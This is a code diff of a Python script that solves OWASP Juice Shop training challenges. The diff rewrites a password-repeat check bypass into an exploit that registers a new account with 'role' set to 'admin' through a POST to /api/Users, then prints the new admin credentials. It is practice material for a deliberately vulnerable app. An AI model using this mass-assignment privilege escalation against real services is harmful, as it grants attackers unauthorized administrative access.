@@ -1,30 +1,29 @@
 """
-This file is used to solve the OWASP Juice-shop Task REPETITIVE REGISTRATION
-Principle: If we have successfully repeated our password, we can change the first password
-Methodology: If we are using request, we can avoid the checking.
+This file is used to solve OWASP JUICESHOP challange ADMIN REGISTRATION
+GOAL: Register a new user and set to be admin
+Principle: Use POST request and set the role from customer to admin
 """
-
-import requests
 
 from plugins import attack as a
 from plugins import test_user_generate as usrGen
 import urllib3
+from plugins import header_config
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class test_repetitive_registration(a.attack_inter):
+class admin_registration(a.attack_inter):
     def __init__(self):
         self.juice_session = a.requests.session()
         self.url = a.URL + '/api/Users'
+        self.password = '123456'
         usr = usrGen.new_user_generate()
         self.email = usr.generate_email()
-        self.password = '123456'
 
     def generator(self):
         json_data = {
             'email': self.email,
             'password': self.password,
-            'passwordRepeat': '12345',
-            'role': 'user',
+            'passwordRepeat': '123456',
+            'role':'admin',
             'securityQuestion': {
                 'id': 2,
                 'question': 'Mother\'s maiden name?',
@@ -37,17 +36,13 @@ class test_repetitive_registration(a.attack_inter):
         json_data = self.generator()
         response = a.requests.post(self.url, json=json_data, verify=False)
         print(response.status_code)
-
+        ## load cookie
         if response.status_code == 201:
             res_payload_dict = response.json()
-            print("Congratulations! You have successfully finished task Repetitive Registration")
-            print("Now you can login with user email " + self.email + " and password " + self.password)
-
-
-
-
-
-
-
+            print("response begin")
+            print(response.text)
+            print("response end")
+            print("Congratulations! You have successfully solve a challenge Admin Registration")
+            print("Now you can login with admin email " + self.email +" and password " + self.password)
 
 
